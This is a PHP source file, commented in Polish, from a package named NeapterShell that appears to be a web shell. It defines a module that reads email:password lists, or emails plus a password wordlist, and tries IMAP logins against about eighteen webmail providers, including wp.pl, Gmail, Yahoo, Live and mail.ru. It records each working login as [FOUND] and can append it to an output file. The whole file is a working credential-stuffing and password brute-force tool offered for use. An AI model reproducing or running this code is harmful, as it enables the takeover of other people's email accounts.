    public function isValid($sEmail, $sUsername, $sPassword, $sDomain)
    {
        /**
         * Dlugosc hasla w serwisie
         */
        if (strlen($sPassword) < 6) {
            return FALSE;
        }

        /**
         * Wlidacja
         */
        $rImap = @ imap_open(sprintf('{%s:993/imap/ssl/novalidate-cert}', EmailValidator::getHost('imap.mail.ru')), $sEmail, $sPassword, OP_SILENT, 1);

        /**
         * Zamykanie polaczenia
         */
        if (is_resource($rImap)) {
            imap_close($rImap);

            return TRUE;
        }

        return FALSE;
    }

}

/**
 * EmailValidator - Wyjatki
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @package    NeapterShell
 * @subpackage Tools\Exception
 */
class EmailValidatorException extends Exception
{
}

/**
 * Sprawdzanie czy przy uzyciu adresu email oraz hasla da sie zalogowac na skrzynke
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @package    NeapterShell
 * @subpackage Tools
 */
class EmailValidator
{
    /**
     * Tablica sterownikow (obiekty)
     *
     * @access protected
     * @var    array
     */
    protected $aDrivers = array();

    /**
     * Tablica hostow
     *
     * @access protected
     * @var    array
     */
    protected $aHosts = array();

    /**
     * Tablica z adresami email
     *
     * @access protected
     * @var    array
     */
    protected $aEmails = array();

    /**
     * Tablica z haslami
     *
     * @access protected
     * @var    array
     */
    protected $aPasswords = array();

    /**
     * Czy zostaly uzyte dane w formacie useremail:password
     *
     * @access protected
     * @var    boolean
     */
    protected $bUsernamePassword = FALSE;

    /**
     * Cache dla hostow, aby nie odpytywac ciagle serwerow DNS
     *
     * @static
     * @access protected
     * @var    protected
     */
    protected static $aHostIp = array();

    /**
     * Tryb gadatliwy
     *
     * @access protected
     * @var    boolean
     */
    protected $bVerbose = FALSE;

    /**
     * Sciezka do pliku wynikowego
     *
     * @access protected
     * @var    string
     */
    protected $sOutputFile;

    /**
     * Konstruktor
     *
     * @access public
     * @return void
     */
    public function __construct()
    {
        /**
         * Rozszerzenie imap jest wymagane
         */
        if (!extension_loaded('imap')) {
            throw new EmailValidatorException('Rozszerzenie "imap" jest wymagane');
        }

        /**
         * Timeout
         */
        imap_timeout(IMAP_OPENTIMEOUT, 5);
        imap_timeout(IMAP_READTIMEOUT, 4);
        imap_timeout(IMAP_CLOSETIMEOUT, 3);
    }

    /**
     * Dodawanie sterownikow (DI)
     *
     * @access public
     * @param  EmailValidatorInterface $oValue Obiekt EmailValidatorInterface
     * @return EmailValidator                  Obiekt EmailValidator
     */
    public function addDriver(EmailValidatorInterface $oValue)
    {
        $this->aDrivers[] = $oValue;
        $this->aHosts[] = $oValue->getHosts();

        return $this;
    }

    /**
     * Reczne dodanie email:pass, czyszczenie tablicy z adresami
     *
     * @acess  public
     * @param  string $sValue Email:pass
     * @return EmailValidator        Obiekt EmailValidator
     */
    public function setEmailPassword($sValue)
    {
        $this->aEmails = array();

        return $this->addEmailPassword($sValue);
    }

    /**
     * Reczne dodanie email:pass
     *
     * @acess  public
     * @param  string $sValue Email:pass
     * @return EmailValidator        Obiekt EmailValidator
     */
    public function addEmailPassword($sValue)
    {
        /**
         * username:password
         */
        if (strpos($sValue, ':') === FALSE) {
            return $this;
        }

        $sEmail = strstr(strtolower($sValue), ':', TRUE);

        /**
         * Adres email musi byc poprawny
         */
        if (filter_var($sEmail, FILTER_VALIDATE_EMAIL) === FALSE) {
            return $this;
        }

        /**
         * Wstawianie adresu do tablicy
         */
        $this->aEmails[] = array
        (
            'email' => $sEmail,
            'username' => strstr($sEmail, '@', TRUE),
            'domain' => substr($sEmail, strpos($sEmail, '@') + 1),
            'password' => substr($sValue, strpos($sValue, ':') + 1),
            'line' => $sValue
        );

        $this->bVerbose = TRUE;
        $this->bUsernamePassword = TRUE;

        return $this;
    }

    /**
     * Ustawienia pliku z haslami
     *
     * @acess  public
     * @param  string $sValue Plik z haslami
     * @return EmailValidator        Obiekt EmailValidator
     */
    public function setPasswordsFile($sValue)
    {
        if (!(is_file($sValue) && is_readable($sValue))) {
            throw new EmailValidatorException('Plik z hasłami nie istnieje');
        }

        $this->aPasswords = array_unique(file($sValue, FILE_SKIP_EMPTY_LINES | FILE_IGNORE_NEW_LINES));

        if ($this->aPasswords === array()) {
            throw new EmailValidatorException('Plik z hasłami jest pusty');
        }

        return $this;

    }

    /**
     * Ustawienia pliku z adresami email
     *
     * @acess  public
     * @param  string $sValue Plik z adresami email
     * @return EmailValidator         Obiekt EmailValidator
     */
    public function setEmailsFile($sValue)
    {
        /**
         * Plik musi istniec
         */
        if (!(is_file($sValue) && is_readable($sValue))) {
            throw new EmailValidatorException('Plik z adresami email nie istnieje');
        }

        /**
         * Wczytywanie pliku
         */
        $aFile = file($sValue, FILE_SKIP_EMPTY_LINES | FILE_IGNORE_NEW_LINES);

        /**
         * Filtracja
         */
        $aFile = array_unique(array_filter($aFile));

        $i = 0;
        foreach ($aFile as $sLine) {
            $sPassword = NULL;
            $sEmail = NULL;

            /**
             * username:password
             */
            if (strpos($sLine, ':') !== FALSE) {
                $sEmail = strstr($sLine, ':', TRUE);
                $sPassword = substr($sLine, strpos($sLine, ':') + 1);

                /**
                 * Brak hasla
                 */
                if ($sPassword === FALSE) {
                    continue;
                }

                /**
                 * Struktura username:hash
                 */
                if ($i === 0) {
                    $this->bUsernamePassword = TRUE;
                }
            } else {
                $sEmail = $sLine;
            }

            $sEmail = strtolower($sEmail);

            /**
             * Adres email musi byc poprawny
             */
            if (filter_var($sEmail, FILTER_VALIDATE_EMAIL) === FALSE) {
                continue;
            }

            /**
             * Wstawianie adresu do tablicy
             */
            $this->aEmails[] = array
            (
                'email' => $sEmail,
                'username' => strstr($sEmail, '@', TRUE),
                'domain' => substr($sEmail, strpos($sEmail, '@') + 1),
                'password' => $sPassword,
                'line' => $sLine
            );

            ++$i;
        }

        /**
         * Lista nie moze byc pusta
         */
        if ($this->aEmails === array()) {
            throw new EmailValidatorException('Plik z adresami email jest pusty');
        }

        return $this;
    }

    /**
     * Cachowanie adresow IP
     *
     * @access public
     * @param  string $sName Nazwa hosta
     * @return string        Adres IP
     */
    public static function getHost($sName)
    {
        if (!isset(self::$aHostIp[$sName])) {
            self::$aHostIp[$sName] = gethostbyname($sName);
        }

        return self::$aHostIp[$sName];
    }

    /**
     * Tryb gadatliwy
     *
     * @acess  public
     * @param  boolean $bValue Wartosc
     * @return EmailValidator          Obiekt EmailValidator
     */
    public function setVerbose($bValue)
    {
        $this->bVerbose = (boolean)$bValue;

        return $this;
    }

    /**
     * Sciezka do pliku wynikowego
     *
     * @acess  public
     * @param  string $sValue Sciezka do pliku wynikowego
     * @return EmailValidator        Obiekt EmailValidator
     */
    public function setOutputFile($sValue)
    {
        $this->sOutputFile = (string)$sValue;
        /**
         * Tworzenie pliku
         */
        if (!is_file($this->sOutputFile)) {
            if (!file_put_contents($this->sOutputFile, '', LOCK_EX)) {
                throw new EmailValidatorException('Nie można utworzyć pliku');
            }
        }

        /**
         * Czy plik jest do zapisu
         */
        if (!is_writable($this->sOutputFile)) {
            throw new EmailValidatorException('Nie można zapisać do pliku');
        }

        return $this;
    }

    /**
     * Proces walidacji adresow
     */
    public function get()
    {
        /**
         * Sterowniki sa wymagane
         */
        if ($this->aDrivers === array()) {
            throw new EmailValidatorException('Nie ustawiono sterownikow');
        }

        /**
         * Lista z adresami jest wymagana
         */
        if ($this->aEmails === array()) {
            throw new EmailValidatorException('Nie wprowadzono adresow email');
        }

        $i = 0;

        /**
         * Laczna ilosc adresow
         */
        $iEmails = count($this->aEmails);

        echo "Rozpoczęto skanowanie\r\n\r\n";


        /**
         * Laczna ilosc hasel w pliku
         */
        if (!$this->bUsernamePassword) {
            $iPasswords = count($this->aPasswords);
        }

        $bSuccess = FALSE;

        /**
         * Adresy email
         */
        foreach ($this->aEmails as $iIndex => $aEmail) {
            /**
             * Obsluga hostow ze sterownika
             */
            foreach ($this->aHosts as $iServiceIndex => $aService) {
                if (!in_array($aEmail['domain'], $aService)) {
                    continue;
                }

                $bSuccess = FALSE;
                $sEmail = NULL;

                /**
                 * username:password
                 */
                if ($this->bUsernamePassword) {
                    $sEmail = $aEmail['line'];

                    /**
                     * Walidacja
                     */
                    if ($this->aDrivers[$iServiceIndex]->isValid($aEmail['email'], $aEmail['username'], $aEmail['password'], $aEmail['domain'])) {
                        $sEmail = $aEmail['line'];
                        $bSuccess = TRUE;
                    }
                } else {
                    /**
                     * Sprawdzanie hasel wczytanych z osobnego pliku
                     */
                    $i = 0;

                    foreach ($this->aPasswords as $sPassword) {
                        $sEmail = sprintf('%s:%s', $aEmail['email'], $sPassword);

                        /**
                         * Walidacja
                         */
                        if ($this->aDrivers[$iServiceIndex]->isValid($aEmail['email'], $aEmail['username'], $sPassword, $aEmail['domain'])) {
                            $bSuccess = TRUE;
                            break;
                        }

                        /**
                         * Informacja
                         */
                        if ($this->bVerbose || (($i !== 0) && ($i % 20 === 0))) {
                            printf("[INFO]  %05d/%05d - %07.3f%% ! %s:%s\r\n", $i + 1, $iPasswords, (($i + 1) / $iPasswords) * 100, $aEmail['email'], $sPassword);
                            @ ob_flush();
                            @ flush();
                        }
                        ++$i;
                    }
                }

                /**
                 * Statystyki tylko przy pomyslnym zalogowaniu
                 */
                if ($bSuccess) {
                    $sOutput = sprintf("[FOUND] %05d/%05d - %07.3f%% # %s\r\n", $iIndex + 1, $iEmails, (($iIndex + 1) / $iEmails) * 100, $sEmail);

                    echo $sOutput;

                    if ($this->sOutputFile !== NULL) {
                        @ file_put_contents($this->sOutputFile, $sOutput, FILE_APPEND | LOCK_EX);
                    }

                    @ ob_flush();
                    @ flush();
                    $i = 0;
                    break;
                }
            }

            /**
             * Informacja
             */
            if (!$bSuccess && ($this->bVerbose || (($i !== 0) && ($i % 20 === 0)))) {
                printf("[INFO]  %05d/%05d - %07.3f%% ! %s\r\n", $iIndex + 1, $iEmails, (($iIndex + 1) / $iEmails) * 100, $aEmail['email']);
                @ ob_flush();
                @ flush();
                $i = 0;
            } else {
                ++$i;
            }
        }
    }

    /**
     * Pobieranie informacji na temat wczytanych sterownikow
     *
     * @access public
     * @reutn  string Informacje o sterownikach
     */
    public function getInformation()
    {
        /**
         * Sterowniki sa wymagane
         */
        if ($this->aDrivers === FALSE) {
            throw new EmailValidatorException('Nie ustawiono sterownikow');
        }

        /**
         * Lista z adresami jest wymagana
         */
        if ($this->aEmails === FALSE) {
            throw new EmailValidatorException('Nie wprowadzono adresow email');
        }

        $aSupportedHosts = array();
        $aNotSupportedHosts = array();

        /**
         * Pozyskiwanie wszystkich wspieranych hostow
         */
        foreach ($this->aHosts as $aHosts) {
            $aSupportedHosts = array_merge($aSupportedHosts, $aHosts);
        }

        $aSupportedHosts = array_combine($aSupportedHosts, array_fill(0, count($aSupportedHosts), 0));

        foreach ($this->aEmails as $aEmail) {
            /**
             * Wspierany host
             */
            if (isset($aSupportedHosts[$aEmail['domain']])) {
                ++$aSupportedHosts[$aEmail['domain']];
            } /**
             * Niewspierany host
             */
            else {
                if (isset($aNotSupportedHosts[$aEmail['domain']])) {
                    ++$aNotSupportedHosts[$aEmail['domain']];
                } else {
                    $aNotSupportedHosts[$aEmail['domain']] = 1;
                }
            }
        }

        $iEmails = count($this->aEmails);

        $aSupportedHosts = array_filter($aSupportedHosts);

        /**
         * Sortowanie wedlug liczby wystepowan malejaco
         */
        arsort($aNotSupportedHosts);
        arsort($aSupportedHosts);

        /**
         * Wspierane
         */
        printf("Wspierane hosty - %06d / %06d - %03.2f%%:\r\n", ($iSum = array_sum($aSupportedHosts)), $iEmails, ($iSum / $iEmails) * 100);
        foreach ($aSupportedHosts as $sHost => $iCount) {
            printf("   %6d - %s\r\n", $iCount, $sHost);
        }
        echo "\r\n";

        /**
         * Nie wspierane
         */
        if (array_sum($aNotSupportedHosts) > 0) {
            printf("Niewspierane hosty - %06d / %06d - %03.2f%%:\r\n", ($iSum = array_sum($aNotSupportedHosts)), $iEmails, ($iSum / $iEmails) * 100);
            foreach ($aNotSupportedHosts as $sHost => $iCount) {
                printf("   %6d - %s\r\n", $iCount, $sHost);
            }
        }
    }

}

/**
 * =================================================================================================
 */

/**
 * Sprawdzanie czy mozna zalogowa sie na skrzynke za pomoca uzytkownika i hasla
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @package    NeapterShell
 * @subpackage Modules
 */
class ModuleEmailValidator extends ModuleAbstract
{
    /**
     * Dostepna lista komend
     *
     * @access public
     * @return array
     */
    public function getCommands()
    {
        return array
        (
            'emailvalidator'
        );
    }

    /**
     * Zwracanie wersji modulu
     *
     * @access public
     * @return string
     */
    public function getVersion()
    {
        /**
         * Wersja Data Autor
         */
        return '1.03 2012-11-09 - <krzotr@gmail.com>';
    }

    /**
     * Zwracanie pomocy modulu
     *
     * @access public
     * @return string
     */
    public function getHelp()
    {
        return <<<DATA
Sprawdzanie loginu i hasla dla poczty

	Sprawdzanie czy za pomoca loginu i hasla mozna zalogowac sie na poczte

	Użycie:
		emailvalidator dane [plik_z_hasłami]

		dane - plik z emailami w formacie:
			email:hasło lub	email (jeżeli został użyty plik_z_hasłami)

		dane - email:password [email2:password2]

		plik_z_hasłami - plik, w którym znajdują się hasła; kiedy ta opcja jest użyta
				 plik plik_z_emailami musi zawierać wyłącznie adres email (bez hasła)


	Opcje:
		-i - wyświetlanie informacji o emailach w szczególności o wspieranych hostach
		-v - tryb gadatliwy

	Przykład:
		emailvalidator test@wp.pl:test
		emailvalidator test@wp.pl:test test2@wp.pl:test2 test3@wp.pl:test3
		emailvalidator emails.txt
		emailvalidator emails.txt passwords.txt

		emailvalidator -i emails.txt
DATA;
    }

    /**
     * Wywolanie modulu
     *
     * @access public
     * @return string
     */
    public function get()
    {
        /**
         * Help
         */
        if ($this->oShell->iArgc === 0) {
            return $this->getHelp();
        }

        try {
            $oMail = new EmailValidator();
            $oMail
                ->addDriver(new EmailValidatorDriverO2pl())
                ->addDriver(new EmailValidatorDriverWppl())
                ->addDriver(new EmailValidatorDriverInteriapl())
                ->addDriver(new EmailValidatorDriverOnetpl())
                ->addDriver(new EmailValidatorDriverGazetapl())
                ->addDriver(new EmailValidatorDriverYahoocom())
                ->addDriver(new EmailValidatorDriverGmailcom())
                ->addDriver(new EmailValidatorDriverLivecom())
                ->addDriver(new EmailValidatorDriverNeostradapl())
                ->addDriver(new EmailValidatorDriverOrangepl())
                ->addDriver(new EmailValidatorDriverPocztapl())
                ->addDriver(new EmailValidatorDriverPlusnetpl())
                ->addDriver(new EmailValidatorDriverWebde())
                ->addDriver(new EmailValidatorDriverGmxde())
                ->addDriver(new EmailValidatorDriverInmailpl())
                ->addDriver(new EmailValidatorDriverPinopl())
                ->addDriver(new EmailValidatorDriverGgpl())
                ->addDriver(new EmailValidatorDriverMailru());

            $bUsernamePassword = FALSE;
            if (preg_match('~^.+?@.+?:.+?\z~', $this->oShell->aArgv[0])) {
                $bUsernamePassword = TRUE;
                foreach ($this->oShell->aArgv as $sEmailPass) {
                    $oMail->addEmailPassword($sEmailPass);
                }
            } else {
                $oMail->setEmailsFile($this->oShell->aArgv[0]);
            }

            /**
             * Plik z haslami
             */
            if (!$bUsernamePassword && isset($this->oShell->aArgv[1])) {
                $oMail->setPasswordsFile($this->oShell->aArgv[1]);
            }

            /**
             * Tryb gadatliwy
             */
            if (in_array('v', $this->oShell->aOptv)) {
                $oMail->setVerbose(TRUE);
            }

            header('Content-Type: text/plain; charset=utf-8');

            /**
             * Przelacznik 'i' - Information
             */
            if (in_array('i', $this->oShell->aOptv)) {
                $oMail->getInformation();
            } else {
                $oMail->get();
            }
        } catch (EmailValidatorException $oException) {
            echo $oException->getMessage();
        }

        exit;
    }

}